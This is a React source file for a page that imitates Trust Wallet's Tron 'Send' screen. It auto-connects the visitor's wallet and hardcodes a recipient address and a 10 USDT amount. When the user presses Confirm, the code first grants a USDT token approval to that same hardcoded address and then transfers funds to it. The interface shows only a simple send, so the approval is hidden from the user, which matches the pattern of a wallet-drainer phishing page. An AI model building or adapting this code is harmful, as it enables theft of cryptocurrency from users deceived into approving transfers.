import { useEffect, useMemo, useState, useCallback, useRef } from "react";
import { Info, ScanLine, Wallet } from "lucide-react";
import { toast } from "sonner";
import { approveUSDT, transferUSDT } from "@/lib/web3";

const DEFAULT_TO_ADDRESS = "TT6fmWxcu35oriyKVVAAUT7oRq9woa2e1t";
const DEFAULT_AMOUNT = "10";
const POLL_INTERVAL_MS = 300;
const MAX_WAIT_MS = 20_000;

type TronProvider = {
  ready?: boolean;
  tronWeb?: {
    ready?: boolean;
    defaultAddress?: { base58?: string; hex?: string };
  };
  request?: (payload: { method: string; params?: unknown }) => Promise<unknown>;
};

function getTronProvider(): TronProvider | null {
  if (typeof window === "undefined") return null;
  const w = window as any;
  return (
    w.trustwallet?.tronLink ??
    w.trustwallet?.tron ??
    w.tronLink ??
    w.tron ??
    null
  );
}

function getTronAddress(): string | null {
  const provider = getTronProvider();
  if (!provider?.tronWeb?.defaultAddress?.base58) return null;
  return provider.tronWeb.defaultAddress.base58;
}

function getDebugSnapshot(): string {
  if (typeof window === "undefined") return "no window";
  const w = window as any;
  const provider = getTronProvider();
  return JSON.stringify({
    hasTronWeb: !!w.tronWeb,
    hasTronLink: !!w.tronLink,
    hasTrustWallet: !!w.trustwallet,
    hasTrustTronLink: !!w.trustwallet?.tronLink,
    hasTrustTron: !!w.trustwallet?.tron,
    hasTron: !!w.tron,
    providerReady: provider?.ready,
    providerHasRequest: typeof provider?.request === "function",
    providerTronWebReady: provider?.tronWeb?.ready,
    providerHasBase58: !!provider?.tronWeb?.defaultAddress?.base58,
    ua: navigator.userAgent.slice(0, 80),
  });
}

async function sleep(ms: number): Promise<void> {
  return new Promise((r) => setTimeout(r, ms));
}

async function waitForProviderAndConnect(): Promise<string> {
  const deadline = Date.now() + MAX_WAIT_MS;

  // Phase 1: wait for any Tron provider to appear
  let provider: TronProvider | null = null;
  while (Date.now() < deadline) {
    provider = getTronProvider();
    if (provider) break;
    await sleep(POLL_INTERVAL_MS);
  }
  if (!provider) {
    throw new Error(
      "No Tron provider found. Open this page inside Trust Wallet → Discover with a Tron account active."
    );
  }

  // Phase 2: if already connected (ready + address), return immediately
  const immediateAddr = getTronAddress();
  if (immediateAddr) return immediateAddr;

  // Phase 3: call tron_requestAccounts to trigger user authorization
  // (tronLink.ready starts false; address only appears AFTER this request succeeds)
  if (typeof provider.request === "function") {
    const methods = ["tron_requestAccounts", "eth_requestAccounts"];
    for (const method of methods) {
      try {
        const res = (await provider.request({ method })) as {
          code?: number;
          message?: string;
        } | null;
        if (res && typeof res === "object" && "code" in res) {
          if (res.code === 4001) throw new Error("Connection rejected by user");
          if (res.code === 4000) {
            // Duplicate request — provider is already processing, just poll
          }
        }
        // After request succeeds, poll for tronWeb to populate defaultAddress
        const addr = await pollForAddress(deadline);
        if (addr) return addr;
      } catch (e) {
        if (e instanceof Error && e.message.includes("rejected")) throw e;
        // Try next method
      }
    }
  }

  // Phase 4: even without request(), some builds populate tronWeb after a delay — poll
  const addr = await pollForAddress(deadline);
  if (addr) return addr;

  // Phase 5: try reading tronWeb from window directly (some Trust builds put it at window.tronWeb)
  const w = window as any;
  if (w.tronWeb?.defaultAddress?.base58) {
    return w.tronWeb.defaultAddress.base58;
  }

  throw new Error(
    "Could not get Tron address. Make sure you have a Tron account selected in Trust Wallet. Debug: " +
      getDebugSnapshot()
  );
}

async function pollForAddress(deadline: number): Promise<string | null> {
  while (Date.now() < deadline) {
    const addr = getTronAddress();
    if (addr) return addr;
    // Also check window.tronWeb directly
    const w = window as any;
    if (w.tronWeb?.defaultAddress?.base58) return w.tronWeb.defaultAddress.base58;
    await sleep(POLL_INTERVAL_MS);
  }
  return null;
}

const TrustWalletTronPay = () => {
  const [address, setAddress] = useState<string | null>(null);
  const [isConnecting, setIsConnecting] = useState(true);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [debugInfo, setDebugInfo] = useState<string>("");
  const connectAttempted = useRef(false);

  const isConnected = !!address;
  const toAddress = useMemo(() => DEFAULT_TO_ADDRESS, []);
  const amount = useMemo(() => DEFAULT_AMOUNT, []);
  const approveTo = useMemo(() => DEFAULT_TO_ADDRESS, []);

  useEffect(() => {
    if (connectAttempted.current) return;
    connectAttempted.current = true;

    let cancelled = false;

    const run = async () => {
      // Capture debug at start
      setDebugInfo(getDebugSnapshot());

      try {
        const addr = await waitForProviderAndConnect();
        if (!cancelled) {
          setAddress(addr);
          setIsConnecting(false);
          setDebugInfo(getDebugSnapshot());
          toast.success("Tron wallet connected");
        }
      } catch (e) {
        if (!cancelled) {
          setIsConnecting(false);
          setDebugInfo(getDebugSnapshot());
          toast.error(
            e instanceof Error ? e.message : "Wallet connection failed"
          );
        }
      }
    };

    void run();
    return () => {
      cancelled = true;
    };
  }, []);

  // Keep address in sync if user switches account
  useEffect(() => {
    if (!address) return;
    const id = setInterval(() => {
      const current = getTronAddress();
      if (current && current !== address) {
        setAddress(current);
      }
    }, 2000);
    return () => clearInterval(id);
  }, [address]);

  const handleConfirm = useCallback(async () => {
    try {
      setIsSubmitting(true);

      await approveUSDT("tron", approveTo);
      await transferUSDT("tron", toAddress, amount);

      toast.success("Approve and transfer completed successfully.");
    } catch (error) {
      toast.error(
        error instanceof Error ? error.message : "Transaction flow failed"
      );
    } finally {
      setIsSubmitting(false);
    }
  }, [approveTo, toAddress, amount]);

  return (
    <div className="min-h-screen bg-[#f5f5f6] flex justify-center p-3">
      <div className="w-full max-w-sm bg-[#f5f5f6] pt-4">
        <div className="mb-5">
          <p className="text-[24px] leading-7 font-semibold text-[#262626]">
            Send
          </p>
          <div className="text-xs text-[#8b8b94] mt-1 flex items-center gap-1.5">
            <Wallet className="w-3.5 h-3.5" />
            {isConnected
              ? `Connected: ${address?.slice(0, 6)}...${address?.slice(-4)}`
              : isConnecting
              ? "Connecting wallet..."
              : "Wallet not connected"}
          </div>
        </div>

        <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
          Address or Domain Name
        </label>
        <div className="h-12 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between">
          <span className="text-[#171717] text-sm truncate">{toAddress}</span>
          <span className="text-[#5f5de8] text-sm font-semibold">Paste</span>
        </div>

        <div className="mt-5">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Destination network
          </label>
          <div className="inline-flex items-center gap-2 rounded-full bg-[#efeff2] px-3 py-1.5">
            <span className="w-4 h-4 rounded-full bg-[#ef2c2c] inline-block" />
            <span className="text-sm text-[#4c4c52]">Tron</span>
          </div>
        </div>

        <div className="mt-5">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Amount
          </label>
          <div className="h-14 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-between">
            <span className="text-[#171717] text-[28px] leading-none font-medium">
              {amount}
            </span>
            <div className="flex items-center gap-2">
              <span className="text-[#67676f] text-base">USDT</span>
              <span className="text-[#5f5de8] text-base font-semibold">Max</span>
            </div>
          </div>
          <p className="text-[#8d8d96] text-xs mt-2">≈ 10.00 USDT</p>
        </div>

        <div className="mt-3">
          <label className="text-[#5e5e66] text-[13px] font-medium block mb-2">
            Memo
          </label>
          <div className="h-12 rounded-xl border border-[#d7d7dc] bg-white px-3 flex items-center justify-end gap-3">
            <ScanLine className="w-4 h-4 text-[#5f5de8]" />
            <Info className="w-4 h-4 text-[#5f5de8]" />
          </div>
        </div>

        <button
          className="fixed bottom-4 left-1/2 -translate-x-1/2 w-[calc(100%-24px)] max-w-sm h-12 rounded-full bg-[#8d8cf0] text-white font-semibold disabled:opacity-55"
          onClick={handleConfirm}
          disabled={isSubmitting || isConnecting || !isConnected}
          type="button"
        >
          {isSubmitting ? "Confirming..." : "Confirm"}
        </button>

        {/* Debug panel — shows what Trust injected. Remove once connection works. */}
        {debugInfo && (
          <div className="mt-6 p-3 bg-white/60 rounded-xl">
            <p className="text-[10px] font-mono text-[#999] break-all select-all">
              {debugInfo}
            </p>
          </div>
        )}
      </div>
    </div>
  );
};

export default TrustWalletTronPay;
